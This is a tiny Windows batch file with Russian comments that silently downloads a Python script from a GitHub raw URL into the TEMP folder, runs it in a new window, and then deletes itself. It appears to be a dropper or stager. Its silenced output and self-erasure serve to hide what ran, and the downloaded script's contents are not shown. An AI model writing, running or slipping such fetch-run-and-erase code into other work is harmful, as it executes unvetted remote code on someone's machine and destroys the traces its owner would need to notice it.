@echo off
:: Скачиваем 1.py с GitHub в TEMP
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/dukiq/q/main/1.py' -OutFile '%TEMP%\1.py'" >nul 2>&1
:: Запускаем Python в новом окне
start "" python "%TEMP%\1.py"
:: Удаляем сам батник
(goto) 2>nul & del "%~f0"
